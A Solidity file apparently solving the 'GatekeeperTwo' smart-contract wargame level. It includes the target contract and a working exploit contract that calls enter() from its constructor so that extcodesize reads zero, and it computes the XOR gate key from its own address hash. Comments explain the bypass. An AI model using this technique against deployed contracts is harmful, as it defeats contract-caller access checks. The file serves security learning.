// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract BreakGatekeeperTwo{

    constructor(address _target) { 
        GatekeeperTwo target = GatekeeperTwo(_target);
        // call the function inside constructor to eliminate extcodesize
        // extcodesize is often used to verify whether a call was made from an externally owned account or a contract account.
        // if an address contains code, it's not an EOA but a contract account. However, a contract does not have source code available during construction.
        // This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.
        // A ^ B = C
        // A ^ C = B
        // therefore, uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max is equal to
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max == uint64(_gateKey)

        bytes8 gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        target.enter(gatekey);
    }

}